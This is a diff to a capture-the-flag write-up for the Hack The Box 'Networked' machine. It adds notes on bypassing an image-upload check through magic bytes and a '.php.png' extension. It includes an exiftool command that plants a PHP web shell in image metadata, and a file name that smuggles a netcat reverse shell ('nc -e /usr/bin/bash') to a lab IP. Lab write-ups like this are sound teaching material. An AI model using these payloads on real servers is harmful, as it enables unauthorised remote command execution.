@@ -114,6 +114,8 @@ function check_file_type($file) {
 }
 ```
 ## Exploit
+
+### File upload exploit
 From the source code analysis, we can see that the magic bytes in the file are being checked in the ```file_mime_type``` function. This tells us that we can upload other file extensions by simply bypassing the magic headers or introducing a shell in the metadata. For this exploit, we will bypass the magic headers instead
 
 Let's modify the file extensions and the magic bytes in the ```exploit.php``` file using any hexeditor, and save the file as a jpeg file. Afterwards, we will upload the file onto the website 
@@ -289,7 +291,50 @@ cat /root/root.txt
 <Redacted root flag>
 [root@networked ~]# 
 ```
+
 ## Post-exploitation
+### File upload exploit
+
+There is actually no need to change the file extension of the our exploit file to obtain a reverse shell. From upload.php, we can see that the code actually checks for the magic bytes of the file even before checking for file extension. Even though on the web interface, it would show that we are unable to upload file due to invalid image file, the code would have already checked the mime type and execute the reverse shell.
+
+```
+    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
+      echo '<pre>Invalid image file.</pre>';
+      displayform();
+    }
+
+    if ($myFile["error"] !== UPLOAD_ERR_OK) {
+        echo "<p>An error occurred.</p>";
+        displayform();
+        exit;
+    }
+
+    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
+    list ($foo,$ext) = getnameUpload($myFile["name"]);
+    $validext = array('.jpg', '.png', '.gif', '.jpeg');
+    $valid = false;
+    foreach ($validext as $vext) {
+      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
+        $valid = true;
+      }
+    }
+```
+
+Another way of exploiting this vulnerability is to modify the file extensions from .png to .php.png. Afterwards we will modify the metadata of the image file using exiftool
+
+```
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']);?>' image.png
+```
+Subsequently, we will upload the file and viewing the file in the browser will allow us to execute commands.
+
+![Command injection by exiftool](https://github.com/joelczk/writeups/blob/main/HTB/Images/Networked/command_injection_exiftool.PNG)
 ### Command Injection
-It is noticed that ```/``` is an illegal character in creating file names as the server would interpret ```/``` as a directory and as a result, it will be unable to create the file on /var/www/html/upload directory (Unless the file with ```/``` exists on the terminal)
- When creating the reverse shell for 
+When we try to create a file in /var/www/html/uploads, we are should not use ```/``` in our payloads as they will then be interpreted as file location or directory location and the file cannot be created.
+
+```
+bash-4.2$ touch ';nc -e /usr/bin/bash 10.10.16.4 5001'
+touch ';nc -e /usr/bin/bash 10.10.16.4 5001'
+touch: cannot touch ';nc -e /usr/bin/bash 10.10.16.4 5001': No such file or directory
+```
+
+
